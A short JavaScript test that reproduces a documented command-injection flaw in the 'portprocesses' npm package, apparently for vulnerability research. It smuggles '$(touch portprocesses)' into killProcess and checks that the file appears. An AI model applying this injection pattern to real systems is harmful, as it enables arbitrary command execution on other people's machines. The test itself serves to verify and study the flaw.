//https://snyk.io/vuln/SNYK-JS-PORTPROCESSES-1078536
test("Command Injection in portprocesses", () => 
{
    const portprocesses = require('portprocesses');
	const fs = require('fs')
	const path = './portprocesses'
	const sleep = require('sleep');
    
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);

    portprocesses.killProcess('$(touch portprocesses)');
	
	sleep.sleep(5);
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
	fs.unlink(path, () =>  {});//deleting the file after creation
});